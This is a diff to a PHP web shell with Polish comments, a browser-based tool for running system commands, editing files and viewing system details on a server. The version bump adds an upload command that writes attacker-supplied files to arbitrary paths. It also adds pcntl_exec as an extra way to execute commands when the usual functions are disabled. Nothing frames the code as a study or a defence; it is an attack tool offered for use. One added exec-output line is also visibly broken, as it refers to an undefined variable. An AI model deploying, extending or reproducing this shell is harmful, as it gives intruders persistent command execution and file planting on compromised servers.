@@ -28,7 +28,7 @@ class Shell
 	/**
 	 * Wersja
 	 */
-	const VERSION = '0.31a b110908';
+	const VERSION = '0.32 b110910';
 
 	/**
 	 * Help, natywne polecenia
@@ -37,6 +37,7 @@ class Shell
 help - Wyświetlanie pomocy
 modules - Informacje o modułach
 edit - Edycja oraz tworzenie nowego pliku
+upload - Wrzucanie pliku na serwer
 system, exec - Uruchomienie polecenia systemowego
 info - Wyświetla informacje o systemie';
 
@@ -169,6 +170,31 @@ info - Wyświetla informacje o systemie';
 	public $sTmp;
 
 	/**
+	 * Funkcje systemowe
+	 *
+	 * @access public
+	 * @var    array
+	 */
+	public $aSystemFunctions = array
+	(
+		'exec',
+		'shell_exec',
+		'passthru',
+		'system',
+		'popen',
+		'proc_open'
+	);
+
+	/**
+	 * Wlasciwosc potrzeba przy wyswietlaniu pliku pomocy z natywnych modulow
+	 * takich jak getCommandEdit(), getCommandUpload() czy getCommandSystem()
+	 *
+	 * @access private
+	 * @var    boolean
+	 */
+	private $bHelp = FALSE;
+
+	/**
 	 * Konstruktor
 	 *
 	 * @uses   Request
@@ -253,7 +279,12 @@ info - Wyświetla informacje o systemie';
 		/**
 		 * Mozliwosc wywolania polecenia systemowego
 		 */
-		$this -> bExec = ( ! $this -> bSafeMode && ( count( array_diff( array( 'exec', 'shell_exec', 'passthru', 'system', 'popen', 'proc_open' ), $this -> aDisableFunctions ) ) > 0 ) );
+		if( function_exists( 'pcntl_exec' ) )
+		{
+			$this -> aSystemFunctions[] = 'pcntl_exec';
+		}
+
+		$this -> bExec = ( ! $this -> bSafeMode && ( count( array_diff( $this -> aSystemFunctions, $this -> aDisableFunctions ) ) > 0 ) );
 
 		/**
 		 * Jesli SafeMode jest wylaczony
@@ -399,8 +430,8 @@ info - Wyświetla informacje o systemie';
 				php_sapi_name(),
 				php_uname(),
 				$this -> sTmp,
-				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'brak' : $sDisableFunctions ),
-				implode( ', ', array_map( create_function( '$sVal', 'return strtolower( substr( $sVal, 6 ) );' ), array_keys( $this -> aHelpModules ) ) )
+				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'Brak' : $sDisableFunctions ),
+				( ( ( $sModules = implode( ', ', array_map( create_function( '$sVal', 'return strtolower( substr( $sVal, 6 ) );' ), array_keys( $this -> aHelpModules ) ) ) ) === '' ) ? 'Brak' : $sModules )
 		);
 	}
 
@@ -415,7 +446,7 @@ info - Wyświetla informacje o systemie';
 		/**
 		 * Help
 		 */
-		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		if( $this -> bHelp || ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<DATA
 modules - Informacje o modułach
@@ -535,6 +566,15 @@ DATA;
 	 */
 	private function getCommandHelp()
 	{
+		if( $this -> bHelp )
+		{
+			return <<<DATA
+help - Wyświetlanie pomocy
+
+	Użycie:
+		help
+DATA;
+		}
 		$iMaxLen = 0;
 
 		/**
@@ -571,7 +611,7 @@ DATA;
 		}
 
 		/**
-		 * Formatowanie helpow
+		 * Formatowanie naglowkow z natywnych modulow
 		 */
 		foreach( $aHelp as $sLine )
 		{
@@ -580,9 +620,8 @@ DATA;
 			$sOutput .= str_pad( substr( $sLine, 0, $iPos ), $iMaxLen, ' ' ) . rtrim( substr( $sLine, $iPos -  1 ) ) . "\r\n";
 		}
 
-
 		/**
-		 * Formatowanie helpow
+		 * Formatowanie naglowkow z zewnetrznych modulow
 		 */
 		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
 		{
@@ -597,7 +636,29 @@ DATA;
 		$sOutput .= "\r\n\r\n";
 
 		/**
-		 * Naglowki
+		 * Formatowanie natywnych helpow
+		 */
+		$oReflection = new ReFlectionClass( 'shell' );
+		$aHelpModules = $oReflection -> getMethods();
+
+		/**
+		 * Wymuszenie uzycia pliku pomocy dna natywnych polecen
+		 */
+		$this -> bHelp = TRUE;
+
+		foreach( $aHelpModules as $oMethod )
+		{
+			$sMethod = $oMethod -> getName();
+
+			if( ! ( ( strncasecmp( $sMethod, 'getCommand', 10 ) === 0 ) && ( $sMethod !== 'getCommandCr3d1ts' ) ) )
+			{
+				continue ;
+			}
+			$sOutput .= $this -> $sMethod( TRUE )  . "\r\n\r\n\r\n";
+		}
+
+		/**
+		 * Caly help
 		 */
 		foreach( $this -> aHelpModules as $sModule => $sModuleCmd )
 		{
@@ -618,6 +679,19 @@ DATA;
 	 */
 	public function getCommandSystem( $sCmd )
 	{
+		if( $this -> bHelp )
+		{
+			return <<<DATA
+system - Uruchomienie polecenia systemowego
+
+	Użycie:
+		system polecenie - uruchomienie polecenia
+
+	Przykład:
+		system ls -la
+DATA;
+		}
+
 		if( ! $this -> bSafeMode )
 		{
 			if( strncmp( $sCmd, 'cd ', 3 ) === 0 )
@@ -657,10 +731,7 @@ DATA;
 			{
 				echo "exec():\r\n\r\n";
 				exec( $sCmd, $aOutput );
-				foreach( $aOutput as $sLine )
-				{
-					printf( "%s\r\n", $sLine );
-				}
+				echo implode( "\r\n", $sLine ) . "\r\n";
 			}
 			/**
 			 * popen
@@ -669,9 +740,13 @@ DATA;
 			{
 				echo "popen():\r\n\r\n";
 				$rFp = popen( $sCmd, 'r' );
-				while( ! feof( $rFp ) )
+
+				if( is_resource( $rFp ) )
 				{
-					echo fread( $rFp, 1024 );
+					while( ! feof( $rFp ) )
+					{
+						echo fread( $rFp, 1024 );
+					}
 				}
 			}
 			/**
@@ -696,6 +771,25 @@ DATA;
 						usleep( 10000 );
 					}
 				}
+			}
+			/**
+			 * pcntl_exec
+			 */
+			else if( function_exists( 'pcntl_exec' ) && ! in_array( 'pcntl_exec', $this -> aDisableFunctions ) )
+			{
+				echo "pcntl_exec():\r\n\r\n";
+				$sPath = NULL;
+				$aArgs = array();
+				if( ( $iPos = strpos( $sCmd, ' ') ) === FALSE )
+				{
+					$sPath = $sCmd;
+				}
+				else
+				{
+					$sPath = substr( $sCmd, 0, $iPos );
+					$aArgs = explode( ' ', substr( $sCmd, $iPos + 1 ) );
+				}
+				pcntl_exec( $sPath, $aArgs );
 			}
 			else
 			{
@@ -724,7 +818,7 @@ DATA;
 		/**
 		 * Help
 		 */
-		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		if( $this -> bHelp || ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<DATA
 edit - Edycja oraz tworzenie nowego pliku
@@ -747,9 +841,47 @@ DATA;
 		 * Formularz
 		 */
 		return sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
-			sprintf( '<textarea id="console" name="filedata">%s</textarea><div>', ( ( is_file( $sFile ) && is_readable( $sFile ) ) ? file_get_contents( $sFile ) : NULL ) ) .
+			sprintf( '<textarea id="console" name="filedata">%s</textarea><br />', ( ( is_file( $sFile ) && is_readable( $sFile ) ) ? file_get_contents( $sFile ) : NULL ) ) .
 			sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( Request::getPost( 'cmd' ) ) ) .
-			'<input type="submit" name="submit" value="Zapisz" id="cmd-send" /></form></div>';
+			'<input type="submit" name="submit" value="Zapisz" id="cmd-send" /></form>';
+	}
+
+	/**
+	 * Wrzucanie pliku
+	 *
+	 * @access public
+	 * @param  string         $sCmd Sciezka do pliku
+	 * @return string|boolean
+	 */
+	public function getCommandUpload( $sFile )
+	{
+		/**
+		 * Help
+		 */
+		if( $this -> bHelp || ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<DATA
+upload - Wrzucanie pliku na serwer
+
+	Użycie:
+		upload /tmp/plik.php
+DATA;
+		}
+
+		/**
+		 * Zapis do pliku
+		 */
+		if( ( $aFiledata = Request::getFiles( 'file' ) ) !== FALSE )
+		{
+			return move_uploaded_file( $aFiledata['tmp_name'], $sFile );
+		}
+		/**
+		 * Formularz
+		 */
+		return sprintf( '<form action="%s" method="post" enctype="multipart/form-data">', Request::getCurrentUrl() ) .
+			'<pre id="console"><h1>Wrzuć plik</h1><input type="file" name="file" /></pre>' .
+			sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( Request::getPost( 'cmd' ) ) ) .
+			'<input type="submit" name="submit" value="Wrzuć" id="cmd-send" /></form>';
 	}
 
 	/**
@@ -764,7 +896,7 @@ DATA;
 		/**
 		 * Help
 		 */
-		if( $this -> iArgc !== 0 )
+		if( $this -> bHelp || ( $this -> iArgc !== 0 ) )
 		{
 			return <<<DATA
 info - Wyświetla informacje o systemie
@@ -931,6 +1063,29 @@ DATA;
 						$sContent = $mContent;
 					}
 					break ;
+				case 'upload':
+					$mContent = $this -> getCommandUpload( $this -> sArgv );
+
+					if( is_bool( $mContent ) )
+					{
+						$sConsole = sprintf( 'Plik %szostał wrzucony', ( ! $mContent ? 'nie ' : NULL ) );
+					}
+					/**
+					 * Help
+					 */
+					else if( strncmp( $mContent, '<form', 5 ) !== 0 )
+					{
+						$sConsole = $mContent;
+					}
+					/**
+					 * Formularz sluzacy do wrzucenia pliku
+					 */
+					else
+					{
+						$bOwnContent = TRUE;
+						$sContent = $mContent;
+					}
+					break ;
 				default :
 					if( $this -> aModules === array() )
 					{
@@ -978,10 +1133,10 @@ DATA;
 		 */
 		if( ! $bOwnContent )
 		{
-			$sContent  = sprintf( '<pre id="console">%s</pre><div>', $sConsole ) .
+			$sContent  = sprintf( '<pre id="console">%s</pre><br />', $sConsole ) .
 				     sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
 				     sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : (string) $sCmd ) ) ) .
-				     '<input type="submit" name="submit" value="Execute" id="cmd-send" /></form></div>';
+				     '<input type="submit" name="submit" value="Execute" id="cmd-send" /></form>';
 		}
 
 		return $this -> getContent( $sContent );
@@ -1004,9 +1159,9 @@ DATA;
 		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
 		$sVersion = self::VERSION;
 return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style></head><body>
-<div id=\"body\">" .
-( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>" : NULL ) .
-"<div id=\"content\">{$sData}</div>" .
+<div id=\"body\">\r\n" .
+( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>\r\n" : NULL ) .
+"<div id=\"content\">{$sData}</div></div>" .
 ( $bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL ) .
 "</div></body></html>";
 	}
